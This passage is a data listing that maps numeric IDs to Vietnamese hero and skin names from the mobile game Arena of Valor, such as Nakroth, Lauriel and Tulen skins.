    "13111": "Murad Byakuya Kuchiki", "13112": "Murad Zenitsu Agatsuma", "13113": "Murad Thích Khách Sa Mạc", "13114": "Murad S-Quang Vinh",
    "13115": "Murad Huyết hỏa cuồng đồ", "13116": "Murad Tuyệt thế thần binh", "13117": "Murad Chiến binh đồ chơi", "13118": "Murad Thiên Luân Kiếm Thánh",
    "13119": "Murad Thần Pháo hoa", "13200": "Hayate", "13201": "Hayate Bạch ảnh", "13202": "Hayate chiến binh trăng khuyết",
    "13203": "Hayate Ngân lang", "13204": "Hayate Quỷ diện", "13205": "Hayate Tử thần vũ trụ", "13206": "Hayate Mãnh hổ kim cang",
    "13207": "Hayate Tu Di Thánh Đế", "13208": "Hayate Bóng người dưới trăng", "13209": "Hayate Bạch vô thường", "13210": "Hayate Bạch lang",
    "13211": "Hayate Kim ưng sát thủ", "13212": "Hayate Thống soái Dạ Ưng", "13213": "Hayate Siêu đạo chích Kid", "13214": "Hayate Đầu bếp Yakitori",
    "13300": "Dolia", "13301": "Dolia Hoa tiêu đại dương", "13302": "Dolia Môn đồ tập sự", "13303": "Dolia Mã Khởi Thiên Ca",
    "13313": "Valhein Đệ nhất thần thám", "13314": "Valhein Thứ nguyên vệ thần", "13316": "Valhein Mã Hành Vạn Lý", "13400": "Skud",
    "13401": "Skud Sơn Tặc", "13402": "Skud Quang Vinh", "13403": "Skud Tà linh ma tướng", "13404": "Skud Mafia",
    "13405": "Skud Cứu hộ", "13406": "Skud Quái thần thủy vực", "13500": "Thane", "13501": "Thane",
    "13502": "Thane Quang vinh", "13503": "Thane Mật vụ", "13504": "Thane Kẻ Hủy Diệt", "13505": "Thane Bác ong bay vừa",
    "13506": "Thane Khoảnh khắc vinh quang", "13600": "Kil'Groth", "13601": "Kil'Groth Quang Vinh", "13602": "Kil'Groth Cảnh Vệ Biển",
    "13603": "Kil'Groth Chú lính chì", "13604": "Kil'Groth Càn Nguyên thủ vệ", "13605": "Kil'Groth Hung thần biển sâu", "13609": "Ilumia Khải Huyền Thiên Hậu",
    "13612": "Ilumia Nộ hải Thiên ngư", "13613": "Ilumia Lưỡng Nghi Long Hậu", "13700": "Paine", "13701": "Paine khúc nhạc tử vong",
    "13702": "Paine Phi vụ thế kỷ", "13703": "Paine Công tước máu", "13704": "Paine Ô Thước Đại hiệp", "13705": "Paine Tử xà Bá tước",
    "13706": "Paine Megumi Fushiguro", "13707": "Paine Cửu Sơn Tương Liễu", "14100": "Lauriel", "14101": "Lauriel Đọa Lạc Thiên Sứ",
    "14102": "Lauriel Phù Thủy Bí Ngô", "14103": "Lauriel Hỏa Phượng Hoàng", "14104": "Lauriel Thánh quang sứ", "14105": "Lauriel Lạc thần",
    "14106": "Lauriel Hoa khôi Giáng sinh", "14107": "Lauriel Tinh vân sứ", "14108": "Lauriel Tiệc bãi biển", "14109": "Lauriel thiên sứ công nghệ",
    "14110": "Lauriel Vũ khúc miêu ảnh", "14111": "Lauriel Nữ vương học đường", "14112": "Lauriel Đôi cánh Nguyệt thực", "14113": "Lauriel Phi thiên",
    "14114": "Lauriel Thứ nguyên vệ thần", "14115": "Lauriel Thiên nữ Dạ Ưng", "14116": "Lauriel Mã Đằng Cửu Thế", "14117": "Lauriel Vũ khúc miêu ảnh",
    "14118": "Lauriel Thiên nữ Dạ Ưng", "14120": "Lauriel Mã Đằng Cửu Thế", "14200": "Natalya", "14201": "Natalya Nghệ nhân lân",
    "14202": "Natalya Quý Cô Thủy Tề", "14203": "Natalya Quà Quái Quỷ", "14204": "Natalya Phó nháy nhí nhảnh", "14205": "Natalya nữ quái công nghệ",
    "14206": "Natalya Biệt đội băng lam", "14207": "Natalya Thần Phú Quý", "14208": "Natalya Mị muốn đi chơi", "14209": "Natalya Băng tâm thần nữ",
    "14210": "Natalya Nghệ sĩ ma mị", "14211": "Natalya Nguyệt Ảnh Kiếm Tiên", "14212": "Natalya Nghiệp hỏa yêu hậu", "14213": "Natalya Kuromi's Heart",
    "14214": "Natalya Phù thủy bóng đêm", "14400": "Taara", "14401": "Taara Đại tù trưởng", "14402": "Taara Hỏa Ngọc Nữ Đế",
    "14403": "Taara Tiệc bãi biển", "14404": "Taara Hồng môn đường chủ", "14405": "Taara Tư lệnh hải âu", "14406": "Taara Lam Hải chiến nữ",
    "14407": "Taara Thần chiến tranh", "14408": "Taara Shion", "14412": "Taara Shion", "14600": "Zill",
    "14601": "Zill Lốc Địa Ngục", "14602": "Zill Dung nham", "14603": "Zill Cựu thần thiên hà", "14604": "Zill Diệt nguyệt tử sĩ",
    "14605": "Zill Quái xế", "14606": "Zill Phong thần Tu La", "14607": "Zill Thần mộng mị", "14608": "Zill Con quay gió",
    "14609": "Zill Siêu việt", "14800": "Preyta", "14801": "Preyta Không Tặc", "14802": "Preyta Băng Hỏa Long Sư",
    "14803": "Preyta Phi cơ F1", "14804": "Preyta Ma độc huyết long", "14805": "Preyta Bù nhìn xứ Athanor", "14900": "Xeniel",
    "14901": "Xeniel Thiên Sứ Hủy Diệt", "14902": "Xeniel Trung Vệ Thép", "14903": "Xeniel Kim sí điểu", "14904": "Xeniel Tổng lãnh tinh hệ",
    "14905": "Xeniel Hóa thân Tengu", "14906": "Xeniel Thần thoại Hy Lạp", "14907": "Xeniel Ma sứ tận thế", "14908": "Xeniel Shipper bánh mỳ",
    "14909": "Xeniel Tay trống ngang tàng", "14910": "Xeniel Cấm vệ", "15000": "Nakroth", "15001": "Nakroth Quân đoàn địa ngục",
    "15002": "Nakroth BBoy công nghệ", "15003": "Nakroth Chiến Binh Hỏa Ngục", "15004": "Nakroth Siêu Việt", "15005": "Nakroth Khiêu chiến",
    "15006": "Nakroth Quán quân", "15007": "Nakroth Tiệc Bãi Biển", "15008": "Nakroth Killua", "15009": "Nakroth Lôi Quang Sứ",
    "15010": "Nakroth thứ nguyên vệ thần", "15011": "Nakroth Bạch diện chiến thương", "15012": "Nakroth Producer Tia chớp", "15013": "Nakroth Quỷ thương Liệp Đế",
    "15014": "Nakroth Levi", "15015": "Nakroth Bạch diện chiến thương", "15016": "Nakroth Levi", "15202": "Điêu Thuyền Tiệc bãi biển",
    "15204": "Điêu Thuyền WaVe", "15211": "Điêu Thuyền Thất Tịch Tiên Tử", "15212": "Eternal Sailor Moon", "15216": "Điêu Thuyền Tuế Hàn Đỗ Quyên",
    "15217": "Điêu Thuyền Nhật Nguyệt Thánh Linh", "15300": "Kaine", "15301": "Kaine Đôi Cánh Đại Dương", "15302": "Kaine Dơi Địa Ngục",
    "15303": "Kaine Người dơi", "15304": "Kaine Chiến Binh Kim Quang", "15305": "Kaine Thiếu chủ bóng đêm", "15306": "Kaine Thợ săn chính nghĩa",
    "15409": "Yena WaVe", "15412": "Yena Huyền cửu thiên", "15413": "Yena Trấn Yêu Thần Lộc", "15600": "Aleister",
    "15601": "Aleister Thiếu Niên Hắc Ám", "15602": "Aleister Quang Vinh", "15603": "Aleister Quỷ soái nguyệt tộc", "15604": "Aleister siêu sao bóng rổ",
    "15605": "Aleister Mật vụ thần thám", "15606": "Aleister Ảo thuật gia", "15607": "Aleister Âm dương sư", "15608": "Aleister Xứ sở thần tiên",
    "15609": "Aleister HLV bất bại", "15610": "Aleister Ác nhân đồ chơi", "15611": "Aleister Tư lệnh viễn chinh", "15612": "Aleister S-Quang vinh",
    "15700": "Teeri", "15701": "Teeri Tiểu kì lân", "15702": "Teeri Thuyền trưởng song luân", "15703": "Teeri Ốc quế ngọt ngào",
    "15704": "Teeri Minh tinh ảo thuật", "15705": "Teeri Vân Y Cẩm Tú", "15706": "Teeri Lễ hội té nước", "15707": "Raz Saitama Cosplay",
    "15710": "Raz Bão vũ Cuồng lôi", "15711": "Raz Gon", "15903": "Dolia Nhật Ký Tình Yêu", "15905": "Dolia Mã Khởi Thiên Ca",
    "16200": "Kriknak", "16201": "Kriknak Bọ Cánh Bạc", "16202": "Kriknak Yêu trùng cổ mộ", "16203": "Kriknak ST.L-162",
    "16204": "Kriknak Bọ cánh cam", "16205": "Kriknak Tử trùng DDoS", "16206": "Kriknak Bọ hoàng kim", "16300": "Ryoma",
    "16301": "Ryoma Thợ Săn Tiền Thưởng", "16302": "Ryoma Đại Tướng Nguyệt Tộc", "16303": "Ryoma Thanh long bang chủ", "16304": "Ryoma Samurai Huyền thoại",
    "16305": "Ryoma Dạ hội", "16306": "Ryoma Chiến binh Cyborg", "16307": "Ryoma Ultraman", "16308": "Ryoma Khiêu chiến",
    "16309": "Ryoma Đặc nhiệm Giáng sinh", "16310": "Ryoma Ailing Samurai", "16311": "Ryoma Maple Frost", "16312": "Ryoma Thống lãnh quỷ binh",
    "16600": "Arthur", "16601": "Arthur Lãnh chúa xương", "16602": "Arthur Hoàng kim cốt", "16603": "Arthur Si Tình Kiếm",
    "16604": "Arthur Siêu sao Cricket", "16605": "Arthur Đặc cảnh băng lôi", "16606": "Arthur Hiệp sĩ trăng khuyết", "16607": "Arthur Siêu Việt",
    "16608": "Arthur Băng lam kiếm vệ", "16609": "Arthur Tôn Hổ vô song", "16610": "Arthur Pompompurin‘s Oath", "16612": "Arthur Pompompurin Oath",
    "16700": "Ngộ Không", "16701": "Ngộ Không Đạo tặc", "16702": "Ngộ Không Hỏa Nhãn Kim Tinh", "16703": "Ngộ Không Siêu việt",
    "16704": "Ngộ Không Ngộ Khá Trẩu", "16705": "Ngộ Không Siêu việt 2.0", "16706": "Ngộ Không Đặc vụ băng hầu", "16707": "Ngộ Không Nhóc tỳ bá đạo",
    "16708": "Ngộ Không Thần Giáp Xích Diễm", "16709": "Ngộ Không Tân niên Võ Thần", "16710": "Ngộ Không Cổ thần Ai Cập", "16711": "Ngộ Không Tề Thiên ma hầu",
    "16712": "Ngộ Không Tề Thiên Võ Thánh", "16800": "Lumburr", "16801": "Lumburr", "16802": "Lumburr Cự thần viễn cổ",
    "16803": "Lumburr Vệ binh hỏa diệm", "16804": "Lumburr Máy Đào Khoáng", "16805": "Lumburr Golem thảo nguyên", "16806": "Lumburr Tóm được ngươi rồi",
    "16900": "Slimz", "16901": "Slimz Xứ sở thần tiên", "16902": "Slimz Thỏ Thợ Mỏ", "16903": "Slimz Chú thỏ ngọc",
    "16904": "Slimz Thỏ nhồi bông", "16905": "Slimz Lẩu chua cay", "16906": "Slimz Sứ giả Thiên giới", "16907": "Slimz",
    "16908": "Slimz Linh Hoa đạo sĩ", "16909": "Slimz Thỏ săn ác mộng", "16910": "Slimz Cam siêu quậy", "17000": "Moren",
    "17001": "Moren Anh thợ điện", "17002": "Moren Lính cứu hỏa", "17003": "Moren Binh nhì", "17004": "Moren Thợ cắt cáp",
    "17100": "Cresht", "17101": "Cresht Thợ sửa cáp", "17102": "Cresht Cá Cắn Cáp", "17103": "Cresht Đại sư sushi",
    "17104": "Cresht Caesar bão tố", "17105": "Cresht Bách tướng Lão tam", "17106": "Cresht Eren Jaegar", "17108": "Cresht Eren Jaegar",
    "17300": "Fennik", "17301": "Fennik Nhà thám hiểm", "17302": "Fennik Tiệc Bánh Kẹo", "17303": "Fennik Tuần Lộc Láu Lỉnh",
    "17304": "Fennik Tay đua F1", "17305": "Fennik Phi hành gia", "17306": "Fennik Phi hồ ẩn sĩ", "17307": "Fennik Shipper Siêu thanh",
    "17308": "Fennik Đội đặc nhiệm", "17309": "Fennik Phong Tranh Thám Xuân", "17310": "Fennik Rối Gỗ Tinh Quái", "17311": "Fennik Cáo chiêu tài",
    "17400": "Stuart", "17401": "Stuart Trò đùa tử vong", "17402": "Stuart Vua hề", "17403": "Stuart Gã hề",
    "17404": "Stuart Đạo tặc tử quang", "17405": "Stuart Đêm kinh hoàng", "17406": "Stuart Dạ Xoa thiếu chủ", "17407": "Stuart Siêu trùm phản diện",
    "17408": "Stuart Siêu Trùm phản diện", "17500": "Grakk", "17501": "Grakk Chàng gấu tuyết", "17502": "Grakk Khô Lâu Đại Tướng",
    "17503": "Grakk Thuyền Trưởng Râu Đỏ", "17504": "Grakk Mèo", "17505": "Grakk Sumo", "17506": "Grakk Tiệc bãi biển",
    "17507": "Grakk Cận vệ Mafia", "17508": "Grakk Màu cờ sắc áo", "17509": "Grakk Đi vào lòng đất", "17510": "Grakk Thần ẩm thực",
    "17511": "Grakk Thủ vệ Dạ Ưng", "17512": "Grakk Ngũ Cốc Phong Đăng", "17700": "Lindis", "17701": "Lindis Thám Tử Tư",
    "17702": "Lindis Quang thánh tiễn", "17703": "Lindis Nữ vương pháo hoa", "17704": "Lindis Quang Vinh", "17705": "Lindis Dạ tiệc",
    "17706": "Lindis Đặc vụ thần thám", "17707": "Lindis Đồng phục Shihakusho", "17708": "Lindis Linh Hoa thần nữ", "18000": "Max",
    "18001": "Max Hiệp Sĩ Nhí", "18002": "Max Găng Tay Vàng", "18003": "Max Quang Vinh", "18004": "Max Thần đồng sinh hóa",
    "18005": "Max Tiểu King Kong", "18006": "Max Chuyên gia đập hộp", "18007": "Max Thần thoại Hy Lạp", "18008": "Max",
    "18009": "Max Trà chanh", "18400": "Helen", "18401": "Helen Ngủ trong rừng", "18402": "Helen Hồng Liên tiên tử",
    "18403": "Helen Hotgirl Trà sữa", "18404": "Helen Bé Hoa Xuân", "18405": "Helen Cổ tích Biển xanh", "18406": "Helen Trợ lý nghệ sĩ",
    "18408": "Helen Bé Hoa Xuân", "18600": "Iggy", "18601": "Iggy Tiểu Hoàng Đế", "18602": "Iggy Thần Miêu thiếu chủ",
    "18603": "Iggy Bạch hồ ly", "18604": "Iggy Tiếng thét Hỗn mang", "18605": "Iggy Rimuru Tempest", "18606": "Iggy Đại chiến bùng nổ",
    "18700": "Arum", "18701": "Arum Thú Vệ Cổ Mộ", "18702": "Arum Vũ khúc long hổ", "18703": "Arum Linh tượng vu nữ",
    "18704": "Arum Vũ khúc thần sứ", "18705": "Arum Thỏ may mắn", "18706": "Arum Bạn muốn hẹn hò?", "18707": "Arum Quản lý tài năng",
    "18708": "Arum Nữ hoàng gấu xám", "18709": "Arum Thần tượng nhạc Rock", "18710": "Arum Thần phong Thống lĩnh", "18711": "Arum Ký Ức Đại Dương",
    "18712": "Arum Chị đại Gangster", "18900": "Krizzix", "18901": "Krizzix Cún siêu quậy", "18902": "Krizzix Đội đặc nhiệm",
    "18903": "Krizzix Nghệ sĩ đường phố", "18904": "Krizzix Trưởng lão", "18905": "Krizzix Cursed Corpse", "18906": "Krizzix Thám tử tư",
    "19000": "Tulen", "19001": "Tulen Nhà Thám Hiểm", "19002": "Tulen Tân Thần Thiên Hà", "19003": "Tulen Phù Thủy Kiến Tạo",
    "19004": "Tulen Đông êm đềm", "19005": "Tulen Phó kỷ luật", "19006": "Tulen Tân thần hoàng kim", "19007": "Tulen Chí tôn kiếm tiên",
    "19008": "Tulen Dạ hội", "19009": "Tulen Thần sứ ST.L-79", "19010": "Tulen Hoả thần long tộc", "19011": "Tulen Tiêu Dao Vũ Thần",
    "19012": "Tulen Tân niên vệ thần", "19013": "Tulen Đại úy Athanor", "19014": "Tulen Satoru Gojo", "19015": "Tulen Giám thị sấm sét",
    "19016": "Tulen Thiên Cơ Bạch Trạch", "19100": "Rouie", "19101": "Rouie Sứ giả vũ trụ", "19102": "Rouie Quang Vinh",
    "19103": "Rouie Sứ giả quang minh", "19104": "Rouie Vẹt cầu vồng", "19105": "Rouie Tuần lộc đáng yêu", "19106": "Rouie Công chúa hỏa long",
    "19107": "Rouie Thụy mộc Thanh Long", "19108": "Rouie Mèo hầu gái", "19109": "Rouie Linh Sứ Thời không", "19300": "Amily",
    "19301": "Amily Đặc cảnh NYPD", "19302": "Amily Thư ký", "19303": "Amily Đặc công nhện đỏ", "19304": "Amily Thỏ may mắn",
    "19305": "Amily Võ thần thiên hà", "19306": "Amily Khủng long xanh", "19307": "Amily Nữ đội trưởng", "19308": "Amily Hội ám hoàng",
    "19309": "Amily Thám tử trung học", "19500": "Enzo", "19501": "Enzo Phẩm chất quý tộc", "19502": "Enzo Chiến binh trăng khuyết",
    "19503": "Enzo Thần thoại Hy Lạp", "19504": "Enzo Kurapika", "19505": "Enzo Sát quỷ đoàn", "19506": "Enzo Leo núi",
    "19507": "Enzo Hồng hạc thị vệ", "19508": "Enzo Sát thần Bạch Hổ", "19509": "Enzo Cá heo bảnh chọe", "19510": "Enzo Shinobi Đoạt mệnh",
    "19600": "Yena", "19601": "Yena Khuyên Bạc", "19602": "Yena Thỏ may mắn", "19603": "Yena Chiến binh nguyệt tộc",
    "19604": "Yena Hoạt náo viên", "19605": "Yena Dạ nguyệt thánh nữ", "19606": "Yena Giảng viên tình ái", "19607": "Yena Huyền cửu thiên",
    "19608": "Yena Vũ điệu Giáng sinh", "19609": "Yena WaVe", "19610": "Yena Nữ cướp biển", "19611": "Yena Nữ hoàng thể thao",
    "19612": "Yena Trấn Yêu Thần Lộc", "19613": "Yena Thần Sứ kiều diễm", "19614": "Yena Hoa tiêu mộng giới", "19900": "Eland'orr",
    "19901": "Eland'orr Soái tặc", "19902": "Eland'orr Học viện Carano", "19903": "Eland'orr Phi vụ thế kỷ", "19904": "Eland'orr Siêu Thám Tử",
    "19905": "Eland'orr Chú ong bay cao", "19906": "Eland'orr-Tuxedo", "19907": "Eland'orr Uyên Ương Mộng Điệp", "19908": "Eland'orr Mộng giới thần chủ",
    "19909": "Eland'oor S-Quang vinh", "20600": "Charlotte", "20601": "Charlotte Hexsword", "50100": "Astrid",
    "50101": "Astrid Bạch Kiếm Tiểu Thư", "50102": "Astrid Siêu sao bóng chày", "50103": "Astrid Tổ trưởng học đường", "50104": "Astrid thần thoại hy lạp",
    "50105": "Astrid Xứ sở diệu kỳ", "50106": "Astrid Thần Trí Tuệ", "50107": "Astrid Nữ tổng tài", "50108": "Astrid Hoa anh đào",
    "50109": "Astrid Nữ thuyền trưởng", "50110": "Astrid Tiệc bãi biển", "50111": "Tel'Annas Vũ khúc yêu hồ", "50112": "Tel'Annas Tân niên vệ thần",
    "50117": "Tel'Annas Thiên Vũ Thần Long", "50118": "Tel'Annas Jujutsu Sorcerer", "50119": "Tel'Annas Lân Quang Thánh Diệu", "50120": "Tel'annas Kỷ Nguyên Hổ Phách",
    "50121": "Tel'annas Tiệc bãi biển", "50300": "Zuka", "50301": "Zuka Đại Phú Ông", "50302": "Zuka Giáo Sư Sừng Sỏ",
    "50303": "Zuka Phát Tài", "50304": "Zuka Gấu Nhồi Bông", "50305": "Zuka Diệt nguyệt nguyên soái", "50306": "Zuka Đầu bếp hoàng cung",
    "50307": "Zuka Mãnh hổ", "50308": "Zuka Rapper Big Panda", "50309": "Zuka Ngư ông đắc lợi", "50310": "Zuka Xích Hùng Chiến Giáp",
    "50311": "Zuka Mafia", "50500": "Baldum", "50501": "Baldum chú thợ ống nước", "50502": "Baldum Liệt hỏa dung nham",
    "50503": "Baldum thần thoại hy lạp", "50504": "Baldum Thế giới kẹo ngọt", "50505": "Baldum Đồ chơi", "50506": "Baldum Sói Quàng Khăn Đỏ",
    "50600": "Omen", "50601": "Omen Sĩ Quan Viễn Chinh", "50602": "Omen Ám tử đao", "50603": "Omen Quỷ nguyệt tướng",
    "50604": "Omen Chiến binh trăng khuyết", "50605": "Omen Đao phủ tận thế", "50606": "Omen Thuyền trưởng hải tặc", "50607": "Omen Chiến xa quang minh",
    "50608": "Omen Chiến xa hắc ám", "50609": "Omen Quái Kiệt Guitar", "50610": "Omen Nhạc sĩ huyền thoại", "50611": "Omen Huyết ảnh Tà thần",
    "50612": "Omen Liệt Hỏa Thiên Cang", "50613": "Omen Liệt Hỏa Thiên Cang", "50800": "Wisp", "50801": "Wisp Hải Tặc Nhí",
    "50802": "Wisp Thỏ siêu quậy", "50803": "Wisp Ếch nhồi bông", "50804": "Wisp Cô bé bút chì", "50805": "Wisp Rồng đi bộ",
    "50806": "Wisp Máy phát quà", "50807": "Wisp Bé hề", "50808": "Wisp Tiểu Ronin", "50809": "Wisp Hành trình kỳ ảo",
    "50900": "Y'bneth", "50901": "Y'bneth Hạt trưởng kiểm lâm", "50902": "Y'Bneth Chiến binh lục bảo", "50903": "Y'bneth Động cơ vĩnh cửu",
    "50904": "Y'bneth Titan Băng giá", "50905": "Y'Bneth Candy Bear", "50906": "Y'Bneth Đại Thụ Âm Nhạc", "51000": "Liliana",
    "51001": "Liliana Hồ Quý Phi", "51002": "Liliana thần tượng âm nhạc", "51003": "Liliana Nguyệt mị ly", "51004": "Liliana Tiểu thơ anh đào",
    "51005": "Liliana Tân nguyệt mị ly", "51006": "Liliana Nữ thần F1", "51007": "Liliana Thuỷ thủ hồ ly", "51008": "Liliana WaVe",
    "51009": "Liliana Tiệc bãi biển", "51010": "Liliana Lưu Thủy Thần Long", "51011": "Lilianna Thần hổ Xiêm La", "51012": "Liliana Ma Pháp Tối Thượng",
    "51013": "Liliana Lưu Thủy Thần Long", "51015": "Liliana Ma Pháp Tối Thượng", "51100": "Ata", "51101": "Ata Tân thủy thủ",
    "51102": "Ata Cao bồi", "51103": "Ata Chiến Binh Hải Tộc", "51104": "Ata Mèo đi mưa", "51105": "Ata Quang vinh",
    "51106": "Ata Gà mờ", "51107": "Ata Giao long", "51200": "Rourke", "51201": "Rourke Pháo Thủ Tuộc Neo",
    "51202": "Rourke Biệt đội siêu hùng", "51203": "Rourke Cuồng tặc", "51204": "Rourke Thợ cơ khí", "51205": "Rourke Cảnh sát trưởng",
    "51206": "Rourke Bách tướng Lão đại", "51207": "Rourke Thánh Vệ", "51208": "Rourke Bách Tướng Lão Đại", "51305": "Zata Tác gia đương đại",
    "51306": "Zata Chí tôn Tà Phượng", "51400": "Roxie", "51401": "Roxie Thám tử tập sự", "51402": "Roxie kèn ái tình",
    "51403": "Roxie Hầu gái", "51404": "Roxie Tiệc bánh kẹo", "51405": "Roxie Hỏa thuật sư", "51406": "Roxie Lễ hội hoa",
    "51407": "Roxie", "51408": "Roxie Cháy phố", "51500": "Richter", "51501": "Richter Bá tước",
    "51502": "Richter Thống soái kháng chiến", "51503": "Richter Dạ hội", "51504": "Richter Quang vinh 2.0", "51505": "Richter Kiếm thần Susanoo",
    "51506": "Richter Cứu hộ", "51507": "Richter Tổng Lãnh thiên thần", "51800": "Quillen", "51801": "Quillen Trưởng ngoại khoa",
    "51802": "Quillen Thống soái đế chế", "51803": "Quillen Đặc công mãng xà", "51804": "Quillen Sao đỏ học đường", "51805": "Quillen Huyết thủ nguyệt tộc",
    "51806": "Quillen Tà linh ma đao", "51807": "Quillen Hoàng Kim Soái Vương", "51808": "Quillen Giám đốc âm nhạc", "51809": "Quillen Người gác đền",
    "51810": "Quillen Nghịch thiên long đế", "51811": "Quillen Huyết phong", "51812": "Quillen Đảo thiên đường", "51813": "Quillen Thẩm phán Trăng khuyết",
    "51814": "Quillen Thẩm phán Trăng khuyết", "51900": "Annette", "51901": "Annette Nữ quản ga", "51902": "Annette Xứ sở thần tiên",
    "51903": "Annette Thần tượng âm nhạc", "51904": "Annette Tiệc bãi biển", "51905": "Annette Tiên tri tập sự", "51906": "Annette Chị ong bay thấp",
    "51907": "Annette Nữ sinh trung học", "51908": "Annette Vân mộng tiên tử", "51909": "Annette Phi hành gia", "51910": "Annette Băng kỳ lâm",
    "51911": "Annette Doombot thơ ngây", "52000": "Zata", "52001": "Zata Tư lệnh viễn chinh", "52002": "Zata Sứ giả tinh hệ",
    "52003": "Zata Chí tôn Tà Phượng", "52004": "Zata Tác gia đương đại", "52005": "Zata Khiêu chiến", "52006": "Zata Thần mặt trời",
    "52007": "Zata Xích Huyết Bá Tước", "52008": "Zata Idol Giáng Sinh", "52011": "Veres Lưu ly Long mẫu", "52014": "Veres Idol Giáng Sinh",
    "52100": "Florentino", "52101": "Florentino Vũ kiếm sư", "52102": "Florentino Giám sát tinh hệ", "52103": "Florentino Kiếm sĩ Olympic",
    "52104": "Florentino SEVEN", "52105": "Florentino Thần thoại Hy Lạp", "52106": "Florentino Tà long kiếm sĩ", "52107": "Florentino Hisoka",
    "52108": "Florentino Bá vương âm nhạc", "52109": "Florentino Xứ sở thần tiên", "52110": "Florentino Hỏa diệm Thần Long", "52111": "Florentino S-Quang Vinh",
    "52112": "Florentino S-Quang Vinh", "52113": "Florentino Kỷ Nguyên Hổ Phách", "52200": "Bonnie", "52201": "Bonnie Thỏ ma quái",
    "52202": "Bonnie Cô bé sợ ma", "52203": "Bonnie Hoa hướng dương", "52204": "Bonnie S-Quang vinh", "52205": "Bonnie Tân binh Pixel",
    "52300": "D'arcy", "52301": "D'arcy Nam tước", "52302": "D'arcy Đô đốc tinh hệ", "52303": "D'arcy Pháp sư hỏa long",
    "52304": "D'Arcy Tiến sĩ thiên tài", "52305": "D'Arcy Chân nhân", "52306": "D'Arcy Tông đồ Chân lý", "52307": "D'Arcy Bác sĩ thú y",
    "52400": "Capheny", "52401": "Capheny Hầu gái", "52402": "Capheny Thần tượng âm nhạc", "52403": "Capheny Kimono",
    "52404": "Capheny Toán Hóa Sinh", "52405": "Capheny Phi hành gia", "52406": "Capheny Tử đinh hương", "52407": "Capheny Quân Nhạc Mildar",
    "52408": "Capheny Harley Quinn", "52409": "Capheny Siêu cấp tin tặc", "52410": "Capheny S-Quang Vinh", "52411": "Capheny Vua trò chơi",
    "52412": "Capheny Càn Nguyên Điện Chủ", "52413": "Capheny Bugcag Assemble", "52414": "Capheny Hoa Linh Lan", "52415": "Capheny Bugcag Assemble",
    "52500": "Zip", "52501": "Zip Gà siêu quậy", "52502": "Zip Tiểu đệ hổ báo", "52503": "Zip Cá siêu quậy",
    "52504": "Zip Vua sân cỏ", "52505": "Zip Ông trùm giáng sinh", "52506": "Zip Dây tơ hồng", "52507": "Zip Tiểu quái gánh xiếc",
    "52600": "Celica", "52601": "Celica Nữ cao bồi", "52602": "Celica Đếm cừu", "52603": "Celica Tâm hồn trà sữa",
    "52604": "Celica Băng lam pháo thủ", "52605": "Celica S-Quang Vinh", "52606": "Celica Vịt lướt bọt biển", "52607": "Celica Ảo thuật gia",
    "52700": "Sephera", "52701": "Sephera Quý tiểu thư", "52702": "Sephera Thần tượng âm nhạc", "52703": "Sephera Chiêm tinh gia",
    "52704": "Sephera Phi vụ thế kỷ", "52705": "Sephera Cô thủ thư", "52706": "Sephera Bách nhạn ngân linh", "52707": "Sephera Thần thoại Hy Lạp",
    "52708": "Sephera Lam Hải phu nhân", "52709": "Sephera Thủy Liên Hoa", "52710": "Sephera NoVa Stardust", "52809": "Qi Milim Nava",
    "52810": "Qi Annie Leonhart", "52900": "Volkath", "52901": "Volkath Dạ Huyết Tộc", "52902": "Volkath Ma kỵ tử sĩ",
    "52903": "Volkath Xung thiên thần tướng", "52904": "Volkath Tư lệnh viễn chinh", "52905": "Volkath Chiến thần Ai Cập", "52906": "Volkath Hắc kỵ thời không",
    "52907": "Volkath S - Quang vinh", "52908": "Volkath Ma ảnh thần đao", "53000": "Dirak", "53001": "Dirak Cảnh vệ bầu trời",
    "53002": "Dirak Pháp sư trăng khuyết", "53003": "Dirak Quý tộc", "53004": "Dirak Ông bầu Showbiz", "53005": "Dirak Đường chủ yêu giới",
    "53006": "Dirak Lốp trưởng", "53100": "Keera", "53101": "Keera Y tá lạ", "53102": "Keera Học viên Carano",
    "53103": "Keera Sát thủ bí ngô", "53104": "Keera Tiệc bãi biển", "53105": "Keera Nghệ sĩ Graffiti", "53106": "Keera Nezuko Kamado",
    "53107": "Keera Thuỷ thủ", "53108": "Keera Hồ điệp", "53109": "Keera Môn đồ xảo quyệt", "53110": "Keera Quán quân",
    "53111": "Keera Yêu Thần Nekomata", "53200": "Thorne", "53201": "Thorne Cận vệ hoàng gia", "53202": "Thorne Giả kim thuật sư",
    "53203": "Thorne Quán quân", "53204": "Thorne Tiệc bãi biển", "53205": "Thorne Ước nguyện giáng sinh", "53206": "Thorne Thám tử trung học",
    "53207": "Thorne Thủy thủ", "53300": "Laville", "53301": "Laville Tay đua đường phố", "53302": "Laville Tay súng diệt thần",
    "53303": "Laville Tay súng vô địch", "53304": "Laville Xạ Thần Tinh Vệ", "53305": "Laville Kim quy thần vương", "53306": "Laville Tiệc bãi biển",
    "53307": "Laville Sắc màu Holi", "53308": "Laville Chiến thần MOBA", "53309": "Laville Vệ binh giáng sinh", "53310": "Laville Thám tử học đường",
    "53311": "Laville S-Quang vinh", "53312": "Laville Thợ Săn Truy Ảnh", "53313": "Laville Cơn Lốc Đường Biên", "53400": "Dextra",
    "53401": "Dextra Chiến binh quyến rũ", "53402": "Dextra Quận chúa Tuyết", "53403": "Dextra Quý cô Tuổi Dần", "53404": "Dextra Băng Sa công chúa",
    "53405": "Dextra Lữ khách cao nguyên", "53406": "Dextra Đảo thiên đường", "53500": "Sinestrea", "53501": "Sinestrea Giấc mơ trưa",
    "53502": "Sinestrea Tiểu thư băng giá", "53503": "Sinestrea WaVe", "53504": "Sinestrea Đại tiểu thư", "53505": "Sinestrea Lữ khách sa mạc",
    "53506": "Sinestrea Giấc mộng biển xanh", "53507": "Sinestra Điệp viên cánh cụt", "53508": "Sinestrea S-Quang vinh", "53509": "Sinestrea Nữ quỷ say ngủ",
    "53513": "Sinestrea Định Vị Tuyệt Đối", "53600": "Aoi", "53601": "Aoi Sát Thủ Đô Thị", "53602": "Aoi Hoàng kim công chúa",
    "53603": "Aoi Tiệc bãi biển", "53604": "Aoi Lam Hải quận chúa", "53605": "Aoi Tiểu thư Mafia", "53606": "Aoi Sát thủ Dạ Ưng",
    "53607": "Aoi Quán quân", "53608": "Aoi Mikasa Ackermann", "53611": "Aoi Bách thú triều Long", "53612": "Aoi Mikasa",
    "53700": "Allain", "53701": "Allain Kirito Hắc kiếm sĩ", "53702": "Allain Kirito", "53703": "Allain Tuyết sơn song kiếm",
